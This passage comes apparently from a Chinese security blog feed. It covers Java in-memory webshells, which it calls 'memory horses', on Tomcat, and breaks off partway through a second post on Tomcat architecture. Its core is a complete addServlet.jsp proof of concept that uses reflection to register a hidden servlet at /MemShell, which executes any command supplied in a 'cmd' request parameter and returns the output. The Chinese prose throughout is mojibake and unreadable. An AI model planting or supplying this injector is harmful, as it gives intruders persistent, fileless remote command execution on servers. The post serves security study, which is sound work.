%&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%!<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515253.png" alt="img"></p><h3 id="2-4-æ³¨å†Œè¿›-tomcat"><a href="#2-4-æ³¨å†Œè¿›-tomcat" class="headerlink" title="2.4 æ³¨å†Œè¿› tomcat"></a>2.4 æ³¨å†Œè¿› tomcat</h3><p>å†™å¥½é©¬åï¼Œç¬¬äºŒæ­¥å°±æ˜¯åŠ¨æ€æ³¨å†Œ servlet</p><h4 id="ç¬¬ä¸€æ­¥ï¼šè·å–-standardContext"><a href="#ç¬¬ä¸€æ­¥ï¼šè·å–-standardContext" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šè·å– standardContext"></a>ç¬¬ä¸€æ­¥ï¼šè·å– standardContext</h4><p>åœ¨ jsp ä¸­æœ‰ä¸€ä¸ª request å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¸­å­˜åœ¨ä¸€ä¸ª getServletContext æ–¹æ³•ï¼Œä¼šè·å– servletContext</p><p>åŠ¨æ€è°ƒè¯•ï¼Œæ‰¾åˆ° request å¯¹è±¡è·å–çš„ servletContext ä¸­å­˜åœ¨ StandardContext</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515306.png" alt="img"></p><p>æ¥ä¸‹æ¥å°±åˆ©ç”¨åå°„è·å–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">ServletContext servletContext = request.getServletContext();<br><br>Field applicationContextFiled = servletContext.getClass().getDeclaredField(&quot;context&quot;);<br>applicationContextFiled.setAccessible(true);<br>ApplicationContext applicationContext = (ApplicationContext) applicationContextFiled.get(servletContext);<br><br>Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);<br>standardContextField.setAccessible(true);<br>StandardContext context = (StandardContext) standardContextField.get(applicationContext);<br></code></pre></td></tr></table></figure><h4 id="ç¬¬äºŒæ­¥ï¼šæ³¨å†Œåˆ°-context"><a href="#ç¬¬äºŒæ­¥ï¼šæ³¨å†Œåˆ°-context" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šæ³¨å†Œåˆ° context"></a>ç¬¬äºŒæ­¥ï¼šæ³¨å†Œåˆ° context</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain">//åˆ›å»ºä¸€ä¸ª wrapper<br>Wrapper wrapper = context.createWrapper();<br><br>//è®¾ç½®åå­—<br>wrapper.setName(&quot;MemServlet&quot;);<br><br>//è·å–å…¨ç±»å<br>wrapper.setServletClass(MemServlet.class.getName());<br><br>//å®ä¾‹åŒ– MemServlet ç±»<br>wrapper.setServlet(new MemServlet());<br><br>//æ”¾è¿› context<br>context.addChild(wrapper);<br><br>//è®¾ç½®è·¯å¾„å’Œç±»å<br>context.addServletMappingDecoded(&quot;/MemShell&quot;,&quot;MemServlet&quot;);<br></code></pre></td></tr></table></figure><h4 id="å®Œæ•´çš„-POCï¼šaddServlet-jsp"><a href="#å®Œæ•´çš„-POCï¼šaddServlet-jsp" class="headerlink" title="å®Œæ•´çš„ POCï¼šaddServlet.jsp"></a>å®Œæ•´çš„ POCï¼šaddServlet.jsp</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;&lt;%--<br>Created by IntelliJ IDEA.<br>User: XVSHIFU<br>Date: <span class="hljs-number">2025</span>/<span class="hljs-number">10</span>/<span class="hljs-number">31</span><br>Time: <span class="hljs-number">13</span>:08<br>To change <span class="hljs-built_in">this</span> template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%!<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// è®¡ç®—æœºå¼¹å‡º</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-comment">// MemShell?cmd=whoami  ä»»æ„å‘½ä»¤æ‰§è¡Œ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br><br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> process.getInputStream();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream));<br>                String line;<br>                <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                    res.getWriter().println(line);<br>                &#125;<br>            &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                e.printStackTrace();<br>            &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>%&gt;<br><br>&lt;%<br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextFiled</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>applicationContextFiled.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><span class="hljs-comment">//åˆ›å»ºä¸€ä¸ª wrapper</span><br><span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> context.createWrapper();<br><br><span class="hljs-comment">//è®¾ç½®åå­—</span><br>wrapper.setName(<span class="hljs-string">&quot;MemServlet&quot;</span>);<br><br><span class="hljs-comment">//è·å–å…¨ç±»å</span><br>wrapper.setServletClass(MemServlet.class.getName());<br><br><span class="hljs-comment">//å®ä¾‹åŒ– MemServlet ç±»</span><br>wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MemServlet</span>());<br><br><span class="hljs-comment">//æ”¾è¿› context</span><br>context.addChild(wrapper);<br><br><span class="hljs-comment">//è®¾ç½®è·¯å¾„å’Œç±»å</span><br>context.addServletMappingDecoded(<span class="hljs-string">&quot;/MemShell&quot;</span>,<span class="hljs-string">&quot;MemServlet&quot;</span>);<br><br><br>%&gt;<br><br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="2-5-åˆ©ç”¨"><a href="#2-5-åˆ©ç”¨" class="headerlink" title="2.5 åˆ©ç”¨"></a>2.5 åˆ©ç”¨</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515170.png" alt="img"></p><p>å…ˆå»è®¿é—®ä¼ ä¸Šå»çš„ addServlet.jsp  æ¥åˆ›å»ºä¸€ä¸ª Servlet</p><p>æ­¤æ—¶ MemServlet å·²ç»å†™å…¥äº†å†…å­˜</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081517655.png" alt="img"></p><p>é€šè¿‡è·¯å¾„ &#x2F;MemShell è®¿é—®ï¼šå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081515251.png" alt="img"></p><h1 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h1><p><a href="https://www.cnblogs.com/rebeyond/p/9686213.html">ã€åŸåˆ›ã€‘åˆ©ç”¨â€œè¿›ç¨‹æ³¨å…¥â€å®ç°æ— æ–‡ä»¶ä¸æ­»webshell</a></p><p><a href="https://goodapple.top/archives/1355">Javaå®‰å…¨å­¦ä¹ â€”â€”å†…å­˜é©¬ - æ«ã®Blog</a></p><p><a href="http://101.36.122.13:4000/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/#J9TFY">Springå†…å­˜é©¬ | CurlySeanâ€™s Blog</a></p><p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/#%E7%AE%80%E8%BF%B0%E5%86%85%E5%AD%98shell">Java Agentå®ç°ååºåˆ—åŒ–æ³¨å…¥å†…å­˜shell</a></p><p><a href="https://su18.org/post/memory-shell/">JavaWeb å†…å­˜é©¬ä¸€å‘¨ç›®é€šå…³æ”»ç•¥ | ç´ åå…«</a></p><p><a href="https://su18.org/post/memory-shell-2/">JavaWeb å†…å­˜é©¬äºŒå‘¨ç›®é€šå…³æ”»ç•¥ | ç´ åå…«</a></p><p><a href="https://www.4hou.com/posts/zlkq">Shellä¸­çš„å¹½çµç‹è€…â€”JAVAWEB å†…å­˜é©¬ ã€è®¤çŸ¥ç¯‡ã€‘ - å˜¶å¼ RoarTalk â€“ ç½‘ç»œå®‰å…¨è¡Œä¸šç»¼åˆæœåŠ¡å¹³å°,4hou.com</a></p><p><a href="https://www.freebuf.com/articles/web/433972.html">Javaå†…å­˜é©¬â€”â€”Tomcat Valveå‹çš„ä¸‰ç§æ³¨å…¥ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://hilang.cloud/java-%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9Aspring-boot-controller-%E5%86%85%E5%AD%98%E9%A9%AC/">Java å†…å­˜é©¬ï¼ˆå››ï¼‰ï¼šSpring Boot Controller å†…å­˜é©¬ | æ¸æ€€çš„åšå®¢</a></p><p><a href="https://stoocea.github.io/post/Spring%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html#2-Controller-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Springå‹å†…å­˜é©¬åˆ†æ</a></p><p><a href="https://www.runoob.com/servlet/servlet-intro.html">Servlet ç®€ä»‹ | èœé¸Ÿæ•™ç¨‹</a></p><p><a href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">Springå†…å­˜é©¬å­¦ä¹ </a></p><p><a href="https://xz.aliyun.com/news/11493">Springå†…å­˜é©¬â€”â€”Controller&#x2F;Interceptoræ„é€ </a></p><p>[åŸºç¡€ç¯‡ - Javassist ä½¿ç”¨æŒ‡å—](<a href="https://changeyourway.github.io/2024/06/07/Java">https://changeyourway.github.io/2024/06/07/Java</a> å®‰å…¨&#x2F;åŸºç¡€ç¯‡-javassistç”¨æ³•æŒ‡å—&#x2F;)</p><p><a href="https://goodapple.top/archives/1145#header-id-20">Javaå®‰å…¨å­¦ä¹ â€”â€”ROMEååºåˆ—åŒ– - æ«ã®Blog</a> ï¼ˆä½¿ç”¨Javassistç¼©çŸ­æ¶æ„classï¼‰</p><p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/">Java Agentå®ç°ååºåˆ—åŒ–æ³¨å…¥å†…å­˜shell</a></p><p><a href="http://101.36.122.13:4000/2025/08/05/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC">Agentå†…å­˜é©¬ | CurlySeanâ€™s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Javaå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javaå®‰å…¨</tag>
      
      <tag>å†…å­˜é©¬</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java å†…å­˜é©¬ç¬¬ä¸€ç¯‡ - åŸºç¡€</title>
    <link href="/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%80%E7%AF%87%20-%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%80%E7%AF%87%20-%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-å†…å­˜é©¬ç¬¬ä¸€ç¯‡-åŸºç¡€"><a href="#Java-å†…å­˜é©¬ç¬¬ä¸€ç¯‡-åŸºç¡€" class="headerlink" title="Java å†…å­˜é©¬ç¬¬ä¸€ç¯‡ - åŸºç¡€"></a>Java å†…å­˜é©¬ç¬¬ä¸€ç¯‡ - åŸºç¡€</h1><h1 id="ä¸€ã€åŸºç¡€ï¼š"><a href="#ä¸€ã€åŸºç¡€ï¼š" class="headerlink" title="ä¸€ã€åŸºç¡€ï¼š"></a>ä¸€ã€åŸºç¡€ï¼š</h1><h2 id="1-ä»€ä¹ˆæ˜¯å†…å­˜é©¬"><a href="#1-ä»€ä¹ˆæ˜¯å†…å­˜é©¬" class="headerlink" title="1. ä»€ä¹ˆæ˜¯å†…å­˜é©¬"></a>1. ä»€ä¹ˆæ˜¯å†…å­˜é©¬</h2><p>æ— æ–‡ä»¶çš„ webshell</p><blockquote><p><font style="color:rgb(0, 0, 0);">å†…å­˜é©¬åˆåæ— æ–‡ä»¶é©¬ï¼Œè§åçŸ¥æ„ï¼Œä¹Ÿå°±æ˜¯æ— æ–‡ä»¶è½åœ°çš„ webshell æŠ€æœ¯ï¼Œæ˜¯ç”±äº webshell ç‰¹å¾è¯†</font><font style="color:rgb(0, 0, 0);">åˆ«ã€é˜²ç¯¡æ”¹ã€ç›®å½•ç›‘æ§ç­‰ç­‰é’ˆå¯¹ web åº”ç”¨ç›®å½•æˆ–æœåŠ¡å™¨æ–‡ä»¶é˜²å¾¡æ‰‹æ®µçš„ä»‹å…¥ï¼Œå¯¼è‡´çš„æ–‡ä»¶ shell éš¾ä»¥å†™å…¥å’ŒæŒä¹…è€Œè¡ç”Ÿå‡ºçš„ä¸€ç§â€œæ¦‚å¿µå‹â€æœ¨é©¬ã€‚è¿™ç§æŠ€æœ¯çš„æ ¸å¿ƒæ€æƒ³éå¸¸ç®€å•ï¼Œä¸€å¥è¯å°±èƒ½æ¦‚æ‹¬ï¼Œé‚£å°±æ˜¯å¯¹è®¿é—®è·¯å¾„æ˜ å°„åŠç›¸å…³å¤„ç†ä»£ç çš„åŠ¨æ€æ³¨å†Œã€‚</font></p></blockquote><h2 id="2-å†…å­˜é©¬åˆ†ç±»ï¼š"><a href="#2-å†…å­˜é©¬åˆ†ç±»ï¼š" class="headerlink" title="2. å†…å­˜é©¬åˆ†ç±»ï¼š"></a>2. å†…å­˜é©¬åˆ†ç±»ï¼š</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081506693.png"></p><h2 id="3-Tomcat-åŸºç¡€"><a href="#3-Tomcat-åŸºç¡€" class="headerlink" title="3. Tomcat åŸºç¡€"></a>3. Tomcat åŸºç¡€</h2><h3 id="3-1-Tomcat-æ¶æ„"><a href="#3-1-Tomcat-æ¶æ„" class="headerlink" title="3.1 Tomcat æ¶æ„"></a>3.1 Tomcat æ¶æ„</h3><h4 id="3-1-1-Tomcat-æ¶æ„"><a href="#3-1-1-Tomcat-æ¶æ„" class="headerlink" title="3.1.1 Tomcat æ¶æ„"></a>3.1.1 Tomcat æ¶æ„</h4><p><strong><font style="color:rgb(51, 51, 51);">Tomcat æ˜¯Webåº”ç”¨æœåŠ¡å™¨,æ˜¯ä¸€ä¸ªServlet&#x2F;JSPå®¹å™¨</font></strong><font style="color:rgb(51, 51, 51);">ï¼ŒåŸºæœ¬æ¡†æ¶å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä¸»è¦æœ‰serverã€serviceã€connectorã€containerã€‚</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508073.jpeg"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081506316.jpeg"></p><p><strong>Serverï¼š</strong></p><p>ä»£è¡¨æ•´ä¸ª Tomcat æœåŠ¡å™¨ã€‚</p><p>ä¸€ä¸ª Tomcat åªæœ‰ä¸€ä¸ª Serverï¼ŒServer ä¸­åŒ…å«è‡³å°‘ä¸€ä¸ª Service ç»„ä»¶ã€‚</p><p><strong>Serviceï¼š</strong></p><p>Service ä¸»è¦æ˜¯ä¸ºäº†å…³è” Connector å’Œ Containerï¼ŒåŒæ—¶ä¼šåˆå§‹åŒ–å®ƒä¸‹é¢çš„å…¶å®ƒç»„ä»¶ï¼Œåœ¨ Connector å’Œ Container å¤–é¢å¤šåŒ…ä¸€å±‚ï¼ŒæŠŠå®ƒä»¬ç»„è£…åœ¨ä¸€èµ·ï¼Œå‘å¤–é¢æä¾›æœåŠ¡ï¼Œ</p><p>ä¸€ä¸ª Service å¯ä»¥è®¾ç½®å¤šä¸ª Connectorï¼Œä½†åªèƒ½æœ‰ä¸€ä¸ª Container å®¹å™¨ã€‚</p><p><strong>Connectorï¼š</strong></p><p>Connector è´Ÿè´£æ¥æ”¶æµè§ˆå™¨å‘è¿‡æ¥çš„ tcp è¿æ¥è¯·æ±‚ï¼Œåˆ›å»ºä¸€ä¸ª Request å’Œ Response å¯¹è±¡åˆ†åˆ«ç”¨äºå’Œè¯·æ±‚ç«¯äº¤æ¢æ•°æ®ï¼Œç„¶åä¼šäº§ç”Ÿä¸€ä¸ªçº¿ç¨‹æ¥å¤„ç†è¿™ä¸ªè¯·æ±‚å¹¶æŠŠäº§ç”Ÿçš„ Request å’Œ Response å¯¹è±¡ä¼ ç»™å¤„ç†è¿™ä¸ªè¯·æ±‚çš„çº¿ç¨‹ã€‚è¿™é‡ŒTomcatä¸­ä¸€ä¸ªConnectorå¯¹åº”äº†ä¸€ä¸ªè¯·æ±‚ï¼Œæ‰€ä»¥serviceå®¹å™¨ä¸­å¯ä»¥åŒæ—¶æœ‰å¤šä¸ªconnectorå¯¹è±¡ã€‚</p><p>ç®€å•æ¥è¯´å°±æ˜¯Connectorå°†åœ¨æŸä¸ªæŒ‡å®šçš„ç«¯å£ä¸Šæ¥ç›‘å¬å®¢æˆ·çš„è¯·æ±‚ï¼Œå°† socket è¿æ¥å°è£…æˆ request å’Œ response å¯¹è±¡ï¼Œåç»­äº¤ç»™ Container ï¼ˆEngineï¼‰æ¥å¤„ç†ï¼Œå¹¶ä»Engineå¤„è·å¾—å“åº”å¹¶è¿”å›ç»™å®¢æˆ·ç«¯ã€‚<br><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508086.jpeg"></p><p>Connectoræ˜¯ä½¿ç”¨protocolHandleræ¥å¤„ç†å…·ä½“çš„è¯·æ±‚ï¼ˆä¸åŒçš„protocolHandlerä»£è¡¨ä¸åŒçš„è¿æ¥ç±»å‹ï¼‰ã€‚</p><p>è€Œæ¯ç§protocolHandleréƒ½ä½¿ç”¨äº†å„è‡ªçš„3ä¸ªé‡è¦ç»„ä»¶æ¥å…·ä½“å¤„ç†è¯·æ±‚ï¼š</p><p>-Endpointï¼šç”¨äºå¤„ç†åº•å±‚Socketè¿æ¥ï¼ˆnioå’Œnio2å®ç°çš„æ˜¯TCP&#x2F;IPåè®®ï¼ŒAprå®ç°çš„æ˜¯SSL&#x2F;TLSåè®®ï¼‰ï¼›</p><p>-Processerï¼šç”¨äºå°†Endpointæ¥æ”¶åˆ°çš„Socketå°è£…æˆRequestï¼ˆå®ç°HTTPåè®®æˆ–websocketåè®®æˆ–AJPåè®®ï¼‰ï¼›</p><p>-Adapterï¼šç”¨äºå°†å°è£…å¥½çš„Requestäº¤ç»™Containerï¼ˆå°†è¯·æ±‚é€‚é…åˆ°servletå®¹å™¨ï¼‰ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081507251.jpeg"></p><p><strong><font style="color:rgb(51, 51, 51);">Containerï¼ˆåˆåCatalinaï¼‰ï¼š</font></strong></p><p><font style="color:rgb(51, 51, 51);">Containerå®¹å™¨åˆ™æ˜¯è´Ÿè´£å°è£…å’Œç®¡ç†Servlet å¤„ç†ç”¨æˆ·çš„servletè¯·æ±‚ï¼Œå¹¶è¿”å›å¯¹è±¡ç»™webç”¨æˆ·çš„æ¨¡å—ã€‚</font></p><p><font style="color:rgb(51, 51, 51);">Tomcatä¸­æœ‰å››ç§ç±»å‹çš„Servletå®¹å™¨ï¼Œä»ä¸Šåˆ°ä¸‹åˆ†åˆ«æ˜¯ Engineã€Hostã€Contextã€Wrapperã€‚</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081507920.jpeg"></p><p>Engineï¼šè¡¨ç¤ºæ•´ä¸ª Catalina çš„ Servlet å¼•æ“ï¼Œç”¨æ¥ç®¡ç†å¤šä¸ªè™šæ‹Ÿç«™ç‚¹ï¼Œä¸€ä¸ª Service æœ€å¤šåªèƒ½æœ‰ä¸€Engineï¼Œä½†æ˜¯ä¸€ä¸ªå¼•æ“å¯åŒ…å«å¤šä¸ª Hostï¼›</p><p>Hostï¼šä»£è¡¨ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œæˆ–è€…è¯´ä¸€ä¸ªç«™ç‚¹ï¼Œå¯ä»¥ç»™ Tomcat é…ç½®å¤šä¸ªè™šæ‹Ÿä¸»æœºåœ°å€ï¼Œè€Œä¸€ä¸ªè™šæ‹Ÿä¸»æœºä¸‹å¯åŒ…å«å¤šä¸ª Contextï¼›</p><p>Contextï¼šè¡¨ç¤ºä¸€ä¸ª Web åº”ç”¨ç¨‹åºï¼Œæ¯ä¸€ä¸ªContextéƒ½æœ‰å”¯ä¸€çš„pathï¼Œä¸€ä¸ªWebåº”ç”¨å¯åŒ…å«å¤šä¸ª Wrapperï¼›</p><p>Wrapperï¼šè¡¨ç¤ºä¸€ä¸ªServletï¼Œè´Ÿè´£ç®¡ç†æ•´ä¸ª Servlet çš„ç”Ÿå‘½å‘¨æœŸï¼ŒåŒ…æ‹¬è£…è½½ã€åˆå§‹åŒ–ã€èµ„æºå›æ”¶ç­‰</p><h4 id="3-1-2-Tomcatå’ŒServletçš„å…³ç³»"><a href="#3-1-2-Tomcatå’ŒServletçš„å…³ç³»" class="headerlink" title="3.1.2 Tomcatå’ŒServletçš„å…³ç³»"></a><font style="color:rgba(0, 0, 0, 0.85);">3.1.2 Tomcatå’ŒServletçš„å…³ç³»</font></h4><p><strong>Tomcat æ˜¯Webåº”ç”¨æœåŠ¡å™¨ï¼Œæ˜¯ä¸€ä¸ªServlet&#x2F;JSPå®¹å™¨</strong>ï¼Œè€ŒServletå®¹å™¨ä»ä¸Šåˆ°ä¸‹åˆ†åˆ«æ˜¯ Engineã€Hostã€Contextã€Wrapperã€‚</p><p>Engineï¼šå®ç°ç±»ä¸º org.apache.catalina.core.StandardEngine</p><p>Hostï¼šå®ç°ç±»ä¸º org.apache.catalina.core.StandardHost</p><p>Contextï¼šå®ç°ç±»ä¸º org.apache.catalina.core.StandardContext</p><p>Wrapperï¼šå®ç°ç±»ä¸º org.apache.catalina.core.StandardWrapper</p><p><font style="color:rgb(51, 51, 51);">åœ¨Tomcatä¸­Wrapperä»£è¡¨ä¸€ä¸ªç‹¬ç«‹çš„servletå®ä¾‹ï¼ŒStandardWrapperæ˜¯Wrapperæ¥å£çš„æ 